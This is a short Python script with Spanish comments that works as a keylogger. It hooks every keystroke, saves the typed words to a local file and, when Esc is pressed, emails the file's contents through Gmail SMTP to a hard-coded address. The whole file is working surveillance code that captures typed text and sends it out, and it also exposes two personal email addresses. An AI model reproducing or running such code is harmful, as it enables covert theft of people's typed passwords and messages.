import keyboard 
import sys
import os
from dotenv import load_dotenv
from email.message import EmailMessage
import ssl
import smtplib

load_dotenv()

email_sender = "andrescamilogarciaanaya11@gmail.com"
password = os.getenv("PASSWORD")
email_reciver = "andrescamilogarcia500@gmail.com"

palabra = ""  # Definimos la variable palabra como global aquí

def pulsacion_tecla(pulsacion):
    global palabra
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == 'space':
            guardar_palabra_al_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name

keyboard.hook(pulsacion_tecla)

def guardar_palabra_al_espacio():
    global palabra
    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
    print(f"Palabra registrada: {palabra}")
    resetear_palabra()

def resetear_palabra():
    global palabra
    palabra = ""

def enviar_correo(destinatario, contenido):
    em = EmailMessage()
    em["From"] = email_sender
    em["To"] = destinatario
    em["Subject"] = "Archivo de salida"
    em.set_content(contenido)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
        smtp.login(email_sender, password)
        smtp.send_message(em)

    print("Correo enviado correctamente.")

try:
    keyboard.wait("esc")
    # Cuando se presiona la tecla "esc", envía el correo con el archivo adjunto
    with open("output.txt", "r") as file:
        contenido = file.read()
    enviar_correo(email_reciver, contenido)
except KeyboardInterrupt:
    print("Script detenido")
